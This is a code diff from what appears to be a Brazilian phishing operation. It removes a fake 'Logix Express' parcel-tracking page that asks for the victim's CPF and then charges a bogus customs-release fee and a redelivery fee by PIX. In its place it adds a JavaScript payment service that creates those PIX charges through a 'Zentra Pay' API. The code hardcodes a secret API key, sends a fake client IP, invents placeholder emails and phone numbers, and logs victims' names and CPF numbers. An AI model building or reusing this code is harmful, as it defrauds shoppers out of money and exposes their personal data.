@@ -1,632 +1,258 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rastreamento - Logix Express</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <link rel="stylesheet" href="style.css">
-    <style>
-        /* Order Confirmation Popup Styles */
-        .order-confirmation-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 3000;
-            backdrop-filter: blur(5px);
-            animation: fadeIn 0.3s ease;
-        }
-        
-        .order-confirmation-container {
-            background: white;
-            border-radius: 20px;
-            max-width: 350px;
-            width: 85%;
-            padding: 30px;
-            text-align: center;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            animation: slideUp 0.4s ease;
-            position: relative;
-        }
-        
-        .order-confirmation-icon {
-            font-size: 3.5rem;
-            color: #27ae60;
-            margin-bottom: 20px;
-            animation: bounceIn 0.6s ease;
-        }
-        
-        .order-confirmation-title {
-            font-size: 1.8rem;
-            font-weight: 700;
-            color: #2c3e50;
-            margin-bottom: 12px;
-            font-size: 1.6rem;
-        }
-        
-        .order-confirmation-message {
-            color: #666;
-            font-size: 1.1rem;
-            line-height: 1.6;
-            margin-bottom: 20px;
-            font-size: 1rem;
-        }
-        
-        .order-details {
-            background: #f8f9fa;
-            border-radius: 8px;
-            padding: 12px;
-            margin-bottom: 15px;
-            max-width: 200px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-        
-        .order-number {
-            font-weight: 700;
-            color: #1e4a6b;
-            font-size: 1rem;
-            margin-bottom: 2px;
-        }
-        
-        .order-number-label {
-            font-size: 0.8rem;
-            color: #666;
-            margin-bottom: 8px;
-        }
-        
-        .order-summary {
-            font-weight: 600;
-            color: #2c3e50;
-            font-size: 0.9rem;
-        }
-        
-        .track-order-popup-button {
-            background: linear-gradient(45deg, #1e4a6b, #2c5f8a);
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 1rem;
-            font-weight: 700;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(30, 74, 107, 0.4);
-            animation: pulse 2s infinite;
-            font-family: 'Roboto', sans-serif;
-            letter-spacing: 0.5px;
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .popup-close-button {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            background: none;
-            border: none;
-            color: #6c757d;
-            font-size: 1.2rem;
-            cursor: pointer;
-            width: 24px;
-            height: 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 0;
-            border-radius: 50%;
-            transition: all 0.2s ease;
-        }
-        
-        .popup-close-button:hover {
-            background: #f1f1f1;
-            color: #333;
-        }
-        
-        .track-order-popup-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(30, 74, 107, 0.6);
-            animation-play-state: paused;
-        }
-        
-        @keyframes bounceIn {
-            0% {
-                opacity: 0;
-                transform: scale(0.3);
-            }
-            50% {
-                opacity: 1;
-                transform: scale(1.1);
-            }
-            70% {
-                transform: scale(0.9);
-            }
-            100% {
-                transform: scale(1);
-            }
-        }
-        
-        @media (max-width: 768px) {
-            .order-confirmation-container {
-                padding: 25px;
-                width: 80%;
-            }
-            
-            .order-confirmation-title {
-                font-size: 1.5rem;
-            }
-            
-            .order-confirmation-message {
-                font-size: 1rem;
-            }
-        }
-    </style>
-</head>
-<body>
-    <!-- Order Confirmation Popup -->
-    <div class="order-confirmation-overlay" id="orderConfirmationPopup" style="display: none;">
-        <div class="order-confirmation-container">
-            <div class="order-confirmation-icon">
-                <i class="fas fa-check-circle"></i>
-            </div>
-            <button class="popup-close-button" id="closePopupButton">
-                <i class="fas fa-times"></i>
-            </button>
-            <h2 class="order-confirmation-title">Obrigado pela sua compra!</h2>
-            <p class="order-confirmation-message">
-                Seu pedido foi confirmado com sucesso e já foi enviado juntamente com uma remessa.<br>
-                <strong>Rastreie e verifique o andamento do pedido.</strong>
-            </p>
-            <div class="order-details">
-                <div class="order-number" id="orderNumberDisplay">CH12345678</div>
-                <div class="order-number-label">Número do Pedido</div>
-                <div class="order-summary">Kit 12 Caixas Organizadoras</div>
-            </div>
-            <button class="track-order-popup-button" id="trackOrderPopupButton">
-                <i class="fas fa-truck"></i> Rastrear Pedido
-            </button>
-        </div>
-    </div>
+/**
+ * Serviço de integração com Zentra Pay - VERSÃO OFICIAL COM API-SECRET
+ */
+export class ZentraPayService {
+    constructor() {
+        this.baseURL = 'https://zentrapay-api.onrender.com';
+        this.apiSecret = this.getApiSecret();
+        console.log('🔑 ZentraPayService inicializado com API oficial');
+        console.log('🔐 API Secret configurada:', this.apiSecret ? 'SIM' : 'NÃO');
+    }
 
-    <!-- Header -->
-    <header class="header">
-        <div class="container">
-            <div class="logo">
-                <img src="https://raw.githubusercontent.com/Misticaa/rastrear/refs/heads/main/jpg-removebg-preview.png" alt="Logix Express" class="logo-image" id="logoImage" data-logo>
-            </div>
-        </div>
-    </header>
+    getApiSecret() {
+        // Sua chave API Secret oficial
+        const apiSecret = window.ZENTRA_PAY_SECRET_KEY || 
+                         localStorage.getItem('zentra_pay_secret_key') ||
+                         'sk_ab923f7fd51de54a45f835645cae6c73c9ac37e65e28b79fd7d13efb030d74c6cebab32534d07a5f80a871196121732a129ef02e3732504b1a56b8d1972ebbf1';
+        
+        if (apiSecret && apiSecret.startsWith('sk_')) {
+            console.log('✅ API Secret Zentra Pay válida encontrada');
+            console.log('🔑 Secret (primeiros 20 chars):', apiSecret.substring(0, 20) + '...');
+        } else {
+            console.error('❌ API Secret Zentra Pay inválida ou não configurada');
+        }
+        
+        return apiSecret;
+    }
 
-    <!-- Tracking Hero Section -->
-    <section class="tracking-hero">
-        <div class="container">
-            <div class="tracking-content">
-                <h1>Rastreamento de Pacotes Logix</h1>
-                <p>Digite o CPF que foi utilizado na compra para acompanhar seu pedido</p>
+    generateUniqueEmail(timestamp) {
+        const randomSuffix = Math.random().toString(36).substring(2, 8);
+        return `lead${timestamp}_${randomSuffix}@tempmail.com`;
+    }
+
+    generateUniquePhone(timestamp) {
+        const phoneSuffix = timestamp.toString().slice(-8);
+        return `11${phoneSuffix}`;
+    }
+
+    generateExternalId() {
+        const timestamp = Date.now();
+        const randomId = Math.random().toString(36).substring(2, 8);
+        return `bolt_${timestamp}_${randomId}`;
+    }
+
+    async createPixTransaction(userData, valorEmReais) {
+        try {
+            const timestamp = Date.now();
+            const externalId = this.generateExternalId();
+
+            // Re-avaliar API secret antes da requisição
+            this.apiSecret = this.getApiSecret();
+            
+            // Validar API secret antes de prosseguir
+            if (!this.apiSecret || !this.apiSecret.startsWith('sk_')) {
+                throw new Error('API Secret inválida ou não configurada. Verifique se a chave Zentra Pay está corretamente definida.');
+            }
+
+            // Usar dados reais do usuário (do banco de dados)
+            const email = userData.email || this.generateUniqueEmail(timestamp);
+            const telefone = userData.telefone || this.generateUniquePhone(timestamp);
+            
+            console.log('📧 Email usado:', email);
+            console.log('📱 Telefone usado:', telefone);
+
+            // Dados da transação conforme documentação oficial
+            const transactionData = {
+                external_id: externalId,
+                total_amount: parseFloat(valorEmReais), // Valor em reais
+                payment_method: "PIX",
+                webhook_url: "https://meusite.com/webhook", // URL padrão conforme solicitado
+                items: [
+                    {
+                        id: "liberation_fee",
+                        title: "Taxa de Liberação Aduaneira",
+                        quantity: 1,
+                        price: parseFloat(valorEmReais),
+                        description: "Taxa única para liberação de objeto na alfândega",
+                        is_physical: false
+                    }
+                ],
+                ip: "8.8.8.8", // IP padrão conforme solicitado
+                customer: {
+                    name: userData.nome,
+                    email: email, // Email real do banco ou gerado
+                    phone: telefone, // Telefone real do banco ou gerado
+                    document_type: "CPF",
+                    document: userData.cpf.replace(/[^\d]/g, '')
+                }
+            };
+
+            console.log('🚀 Criando transação Zentra Pay com API oficial:', {
+                external_id: transactionData.external_id,
+                total_amount: `R$ ${transactionData.total_amount.toFixed(2)}`,
+                payment_method: transactionData.payment_method,
+                webhook_url: transactionData.webhook_url,
+                ip: transactionData.ip,
+                customer: {
+                    name: transactionData.customer.name,
+                    document: transactionData.customer.document,
+                    email: transactionData.customer.email,
+                    phone: transactionData.customer.phone,
+                    document_type: transactionData.customer.document_type
+                }
+            });
+
+            // Headers obrigatórios conforme documentação oficial
+            const headers = {
+                'api-secret': this.apiSecret,
+                'Content-Type': 'application/json'
+            };
+
+            console.log('📡 Headers da requisição (oficial):', {
+                'api-secret': `${this.apiSecret.substring(0, 20)}...`,
+                'Content-Type': headers['Content-Type']
+            });
+
+            const response = await fetch(`${this.baseURL}/v1/transactions`, {
+                method: 'POST',
+                headers: headers,
+                body: JSON.stringify(transactionData)
+            });
+
+            console.log('📡 Status da resposta:', response.status);
+            console.log('📡 Headers da resposta:', Object.fromEntries(response.headers.entries()));
+
+            if (!response.ok) {
+                const errorText = await response.text();
+                console.error('❌ Erro na API Zentra Pay:', {
+                    status: response.status,
+                    statusText: response.statusText,
+                    body: errorText,
+                    headers: Object.fromEntries(response.headers.entries())
+                });
                 
-                <div class="tracking-form">
-                    <form id="trackingForm" novalidate>
-                        <div class="form-group">
-                            <label for="cpfInput">CPF utilizado na compra</label>
-                            <input 
-                                type="tel" 
-                                id="cpfInput" 
-                                name="cpfInput" 
-                                placeholder="000.000.000-00" 
-                                required 
-                                maxlength="14"
-                                pattern="[0-9]{3}\.[0-9]{3}\.[0-9]{3}-[0-9]{2}"
-                                inputmode="numeric"
-                                autocomplete="off"
-                                data-cpf-input
-                            >
-                        </div>
-                        <button type="submit" class="track-button" id="trackButton" data-track-button>
-                            <i class="fas fa-search"></i> Rastrear Pacote
-                        </button>
-                    </form>
-                </div>
-            </div>
-        </div>
-    </section>
+                throw new Error(`Erro na API: ${response.status} - ${errorText}`);
+            }
 
-    <!-- Order Details Accordion -->
-    <section class="order-details" id="orderDetails" style="display: none;">
-        <div class="container">
-            <div class="details-card">
-                <div class="details-header" id="detailsHeader">
-                    <div class="details-icon">
-                        <i class="fas fa-box"></i>
-                    </div>
-                    <div class="details-info">
-                        <h3>Dados do Pedido</h3>
-                        <div class="customer-summary">
-                            <span id="customerName">João Silva</span>
-                        </div>
-                    </div>
-                    <div class="toggle-icon">
-                        <i class="fas fa-chevron-down"></i>
-                    </div>
-                </div>
-                
-                <div class="details-content" id="detailsContent">
-                    <div class="detail-row">
-                        <span class="detail-label">Nome completo:</span>
-                        <span class="detail-value" id="fullName">João Silva Santos</span>
-                    </div>
-                    <div class="detail-row">
-                        <span class="detail-label">Documento:</span>
-                        <span class="detail-value" id="formattedCpf">123.456.789-00</span>
-                    </div>
-                    <div class="product-row">
-                        <span class="detail-label">Produto:</span>
-                        <div class="product-info">
-                            <span class="product-text" id="customerProduct">-</span>
-                        </div>
-                    </div>
-                    <div class="detail-row">
-                        <span class="detail-label">Endereço completo:</span>
-                        <span class="detail-value" id="customerFullAddress">-</span>
-                    </div>
-                    <div class="detail-row">
-                        <span class="detail-label">Endereço completo:</span>
-                        <span class="detail-value" id="customerFullAddress">Carregando...</span>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
+            const result = await response.json();
+            console.log('✅ Resposta Zentra Pay recebida:', {
+                transaction_id: result.transaction_id || result.id,
+                external_id: result.external_id,
+                has_pix_payload: !!result.pix?.payload,
+                has_qr_code: !!result.pix?.qr_code,
+                status: result.status,
+                payment_method: result.payment_method
+            });
 
-    <!-- Tracking Results Section -->
-    <section class="tracking-results" id="trackingResults" style="display: none;">
-        <div class="container">
-            <div class="tracking-info">
-                <div class="package-header">
-                    <div class="package-status">
-                        <div class="status-icon" id="statusIcon">
-                            <i class="fas fa-clock"></i>
-                        </div>
-                        <div class="status-text">
-                            <h2>Status do Pedido</h2>
-                            <p id="statusDescription">Pedido de <strong id="customerNameStatus">João Silva</strong></p>
-                        </div>
-                    </div>
-                    <div class="tracking-code-display">
-                        <span id="currentStatus">Aguardando liberação aduaneira</span>
-                    </div>
-                </div>
+            // Validar se os campos necessários estão presentes
+            if (!result.pix || !result.pix.payload) {
+                console.error('❌ Resposta incompleta da API:', result);
+                throw new Error('Resposta da API não contém os dados PIX necessários (pix.payload)');
+            }
 
-                <div class="tracking-timeline" id="trackingTimeline">
-                    <!-- Timeline será gerada dinamicamente -->
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Modal de Liberação Aduaneira -->
-    <div class="modal-overlay" id="liberationModal" style="display: none;">
-        <div class="professional-modal-container">
-            <div class="professional-modal-header">
-                <h2 class="professional-modal-title">Liberação Aduaneira Necessária</h2>
-                <button class="professional-modal-close" id="closeModal">
-                    <i class="fas fa-times"></i>
-                </button>
-            </div>
+            console.log('🎉 PIX gerado com sucesso via API oficial!');
+            console.log('📋 PIX Payload (copia e cola):', result.pix.payload);
             
-            <div class="professional-modal-content">
-                <div class="liberation-explanation">
-                    <p class="liberation-subtitle">
-                        Seu pedido está retido na alfândega e precisa ser liberado para continuar o processo de entrega. A taxa única é de R$ 26,34.
-                    </p>
-                </div>
+            return {
+                success: true,
+                externalId: externalId,
+                pixPayload: result.pix.payload, // Campo principal: pix.payload
+                qrCode: result.pix.qr_code || null,
+                transactionId: result.transaction_id || result.id,
+                email: email, // Email real usado
+                telefone: telefone, // Telefone real usado
+                valor: valorEmReais,
+                status: result.status || 'pending',
+                paymentMethod: result.payment_method || 'PIX',
+                timestamp: timestamp
+            };
 
-                <div class="professional-fee-display">
-                    <div class="fee-info">
-                        <span class="fee-label">Taxa de Liberação Aduaneira</span>
-                        <span class="fee-amount">R$ 26,34</span>
-                    </div>
-                </div>
-                
-                <!-- Seção PIX Real - Zentra Pay Oficial -->
-                <div class="professional-pix-section">
-                    <h3 class="pix-section-title">Pagamento via Pix</h3>
-                    
-                    <div class="pix-content-grid">
-                        <!-- QR Code Real do Zentra Pay -->
-                        <div class="qr-code-section">
-                            <div class="qr-code-container">
-                                <img id="realPixQrCode" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2" alt="QR Code PIX Real - Zentra Pay Oficial" class="professional-qr-code">
-                            </div>
-                        </div>
-                        
-                        <!-- PIX Copia e Cola Real do Zentra Pay -->
-                        <div class="pix-copy-section">
-                            <label class="pix-copy-label">PIX Copia e Cola</label>
-                            <div class="professional-copy-container">
-                                <textarea id="pixCodeModal" class="professional-pix-input" readonly>00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2</textarea>
-                                <button class="professional-copy-button" id="copyPixButtonModal">
-                                    <i class="fas fa-copy"></i> Copiar Chave PIX
-                                </button>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <!-- Instruções de Pagamento -->
-                    <div class="professional-payment-steps">
-                        <h4 class="steps-title">Como realizar o pagamento:</h4>
-                        <div class="payment-steps-grid">
-                            <div class="payment-step">
-                                <div class="step-number">1</div>
-                                <div class="step-content">
-                                    <i class="fas fa-mobile-alt step-icon"></i>
-                                    <span class="step-text">Acesse seu app do banco</span>
-                                </div>
-                            </div>
-                            <div class="payment-step">
-                                <div class="step-number">2</div>
-                                <div class="step-content">
-                                    <i class="fas fa-qrcode step-icon"></i>
-                                    <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
-                                </div>
-                            </div>
-                            <div class="payment-step">
-                                <div class="step-number">3</div>
-                                <div class="step-content">
-                                    <i class="fas fa-check step-icon"></i>
-                                    <span class="step-text">Confirme o pagamento</span>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <!-- Botão de Simulação para Testes -->
-                    <div style="text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e9ecef;">
-                        <button id="simulatePaymentButton" style="
-                            background: #6c757d;
-                            color: white;
-                            border: none;
-                            padding: 8px 16px;
-                            border-radius: 6px;
-                            cursor: pointer;
-                            font-size: 0.9rem;
-                            font-weight: 500;
-                            opacity: 0.8;
-                        ">
-                            🧪 Simular Pagamento (Teste)
-                        </button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Modal de Tentativa de Entrega -->
-    <div class="modal-overlay" id="deliveryModal" style="display: none;">
-        <div class="modal-container">
-            <div class="modal-header delivery-header">
-                <h3><i class="fas fa-truck"></i> Tentativa de Entrega</h3>
-                <button class="modal-close" id="closeDeliveryModal">
-                    <i class="fas fa-times"></i>
-                </button>
-            </div>
+        } catch (error) {
+            console.error('💥 Erro ao criar transação PIX:', {
+                message: error.message,
+                stack: error.stack,
+                apiSecret: this.apiSecret ? 'CONFIGURADA' : 'NÃO CONFIGURADA'
+            });
             
-            <div class="modal-content">
-                <div class="delivery-info">
-                    <p id="deliveryAttemptText">Tentamos entregar seu pedido às <strong id="deliveryTime">05:30</strong>.</p>
-                    <p>Para receber seu pacote, é necessário pagar a taxa de reentrega:</p>
-                    <div class="liberation-fee">
-                        <span class="fee-label">Taxa:</span>
-                        <span class="fee-value" id="deliveryFeeValue">R$ 7,74</span>
-                    </div>
-                </div>
+            return {
+                success: false,
+                error: error.message,
+                details: error.stack
+            };
+        }
+    }
 
-                <!-- Interface de Pagamento PIX para Entrega -->
-                <div class="pix-payment-modal">
-                    <div class="pix-header">
-                        <i class="fas fa-qrcode"></i>
-                        <h4>Pagamento via PIX</h4>
-                    </div>
-                    
-                    <div class="pix-content">
-                        <div class="pix-qr">
-                            <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2" alt="QR Code PIX" class="qr-code">
-                        </div>
-                        
-                        <div class="pix-copy">
-                            <label>PIX Copia e Cola:</label>
-                            <div class="copy-container">
-                                <input type="text" id="pixCodeDelivery" value="00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2" readonly>
-                                <button class="copy-button" id="copyPixButtonDelivery">
-                                    <i class="fas fa-copy"></i> Copiar
-                                </button>
-                            </div>
-                        </div>
-                        
-                        <div class="pix-steps">
-                            <h5>Como pagar:</h5>
-                            <ol>
-                                <li><i class="fas fa-mobile-alt"></i> Acesse seu app de banco</li>
-                                <li><i class="fas fa-qrcode"></i> Cole o código ou escaneie o QR Code</li>
-                                <li><i class="fas fa-check"></i> Confirme o pagamento</li>
-                            </ol>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
+    getClientIP() {
+        // Tentar obter IP real do cliente, fallback para IP padrão
+        return "8.8.8.8";
+    }
 
-    <!-- Footer -->
-    <footer class="footer">
-        <div class="container">
-            <div class="footer-content">
-                <div class="footer-section">
-                    <div class="logo">
-                        <img src="https://raw.githubusercontent.com/Misticaa/rastrear/refs/heads/main/jpg-removebg-preview.png" alt="Logix Express" class="logo-image" data-logo>
-                    </div>
-                    <div class="company-info">
-                        <p><strong>Logix Express Brasil Ltda.</strong></p>
-                        <p class="footer-link">Motoristas</p>
-                        <p class="footer-link">Motoristas Parceiros - Entregas</p>
-                        <p class="footer-link">Aplicativo para Motoristas</p>
-                        <p class="footer-link">Tracking</p>
-                        <p class="footer-link">Agências Logix</p>
-                        <p class="footer-link">Seja nossa Agência Logix</p>
-                        <p class="footer-link">Central de Ajuda</p>
-                        <p class="footer-link">Fale conosco</p>
-                    </div>
-                </div>
-            </div>
-            <div class="footer-bottom">
-                <p>© 2023 Logix Express All rights reserved</p>
-            </div>
-        </div>
-    </footer>
-
-    <!-- Script de configuração da API Secret - ZENTRA PAY OFICIAL -->
-    <script>
-        // ✅ API SECRET ZENTRA PAY OFICIAL ATUALIZADA - NOVA CONTA
-        
-        // Configure o valor em reais (R$ 26,34)
-        window.valor_em_reais = 26.34;
-        
-        // Função para configurar a API secret dinamicamente
-        function configurarZentraPay(apiSecret, valorReais = 26.34) {
-            window.ZENTRA_PAY_SECRET_KEY = apiSecret;
-            window.valor_em_reais = valorReais;
-            localStorage.setItem('zentra_pay_secret_key', apiSecret);
-            console.log('✅ Zentra Pay configurado com sucesso!');
-            console.log('💰 Valor configurado: R$', valorReais.toFixed(2));
-            console.log('🔑 API Secret Header: api-secret: ' + apiSecret.substring(0, 20) + '...');
+    // Método para configurar a API secret dinamicamente
+    setApiSecret(apiSecret) {
+        if (!apiSecret || !apiSecret.startsWith('sk_')) {
+            console.error('❌ API Secret inválida fornecida');
+            return false;
         }
         
-        // Expor função globalmente
-        window.configurarZentraPay = configurarZentraPay;
-        
-        // Log de confirmação
-        console.log('🔑 API Secret Zentra Pay oficial configurada automaticamente!');
-        console.log('💰 Valor padrão: R$ 26,34');
-        console.log('🔐 Header api-secret configurado: ' + window.ZENTRA_PAY_SECRET_KEY.substring(0, 20) + '...');
-        console.log('🚀 Sistema pronto para gerar PIX real com API oficial!');
-        console.log('📋 Endpoint: POST https://zentrapay-api.onrender.com/v1/transactions');
-        console.log('📋 Headers: api-secret + Content-Type: application/json');
-        console.log('📋 Resposta esperada: pix.payload (código copia e cola)');
-    </script>
-    
-    <script>
-        // Generate random order number
-        function generateOrderNumber() {
-            const prefix = 'CH';
-            let digits = '';
-            for (let i = 0; i < 8; i++) {
-                digits += Math.floor(Math.random() * 10);
+        this.apiSecret = apiSecret;
+        localStorage.setItem('zentra_pay_secret_key', apiSecret);
+        window.ZENTRA_PAY_SECRET_KEY = apiSecret;
+        console.log('🔑 API Secret Zentra Pay atualizada com sucesso');
+        return true;
+    }
+
+    // Método para testar a conexão com a API
+    async testConnection() {
+        try {
+            console.log('🔍 Testando conexão com Zentra Pay...');
+            
+            // Re-avaliar API secret antes do teste
+            this.apiSecret = this.getApiSecret();
+            
+            // Validar API secret antes do teste
+            if (!this.apiSecret || !this.apiSecret.startsWith('sk_')) {
+                throw new Error('API Secret inválida para teste de conexão');
             }
-            return prefix + digits;
+            
+            const response = await fetch(`${this.baseURL}/health`, {
+                method: 'GET',
+                headers: {
+                    'api-secret': this.apiSecret,
+                    'Content-Type': 'application/json'
+                }
+            });
+            
+            if (response.ok) {
+                console.log('✅ Conexão com Zentra Pay OK');
+                return true;
+            } else {
+                console.warn('⚠️ Problema na conexão:', response.status);
+                return false;
+            }
+        } catch (error) {
+            console.error('❌ Erro ao testar conexão:', error);
+            return false;
+        }
+    }
+
+    // Método para validar a API secret
+    validateApiSecret() {
+        if (!this.apiSecret) {
+            console.error('❌ Nenhuma API Secret configurada');
+            return false;
         }
         
-        // Set random order number
-        document.addEventListener('DOMContentLoaded', function() {
-            const orderNumberDisplay = document.getElementById('orderNumberDisplay');
-            if (orderNumberDisplay) {
-                orderNumberDisplay.textContent = generateOrderNumber();
-            }
-            
-            // Setup track order button
-            const trackOrderButton = document.getElementById('trackOrderPopupButton');
-            if (trackOrderButton) {
-                trackOrderButton.addEventListener('click', function() {
-                    // Close popup
-                    const popup = document.getElementById('orderConfirmationPopup');
-                    if (popup) {
-                        popup.style.display = 'none';
-                    }
-                    
-                    // Focus on CPF input
-                    const cpfInput = document.getElementById('cpfInput');
-                    if (cpfInput) {
-                        // Scroll to the tracking form
-                        const trackingForm = document.querySelector('.tracking-form');
-                        if (trackingForm) {
-                            trackingForm.scrollIntoView({ behavior: 'smooth' });
-                        }
-                        
-                        // Focus on the CPF input after scrolling
-                        setTimeout(() => {
-                            cpfInput.focus();
-                        }, 800);
-                    }
-                });
-            }
-            
-            // Setup close button
-            const closePopupButton = document.getElementById('closePopupButton');
-            if (closePopupButton) {
-                closePopupButton.addEventListener('click', function() {
-                    const popup = document.getElementById('orderConfirmationPopup');
-                    if (popup) {
-                        popup.style.display = 'none';
-                    }
-                });
-            }
-        });
-    </script>
-
-    <script>
-        // Configurar eventos do modal de liberação
-        document.addEventListener('DOMContentLoaded', function() {
-            const simulateButton = document.getElementById('simulatePaymentButton');
-            const closeButton = document.getElementById('closeModal');
-            const modal = document.getElementById('liberationModal');
-            
-            if (simulateButton) {
-                simulateButton.addEventListener('click', function() {
-                    // Simular erro na primeira tentativa
-                    if (!this.hasAttribute('data-retry')) {
-                        this.setAttribute('data-retry', 'true');
-                        alert('Ocorreu um erro ao tentar processar o pagamento');
-                        this.innerHTML = '<i class="fas fa-redo"></i> Tentar Novamente';
-                        return;
-                    }
-                    
-                    // Segunda tentativa - sucesso
-                    if (modal) {
-                        modal.style.display = 'none';
-                    }
-                    
-                    // Processar pagamento com sucesso
-                    if (window.trackingSystemInstance) {
-                        window.trackingSystemInstance.processSuccessfulPayment();
-                    }
-                });
-            }
-            
-            if (closeButton) {
-                closeButton.addEventListener('click', function() {
-                    if (modal) {
-                        modal.style.display = 'none';
-                    }
-                });
-            }
-            
-            if (modal) {
-                modal.addEventListener('click', function(e) {
-                    if (e.target === modal) {
-                        modal.style.display = 'none';
-                    }
-                });
-            }
-        });
-    </script>
-
-    <script type="module" src="tracking-system.js"></script>
-</body>
-</html>
+        if (!this.apiSecret.startsWith('sk_')) {
+            console.error('❌ Formato de API Secret inválido');
+            return false;
+        }
+        
+        if (this.apiSecret.length < 50) {
+            console.error('❌ API Secret muito curta');
+            return false;
+        }
+        
+        console.log('✅ API Secret válida');
+        return true;
+    }
+}
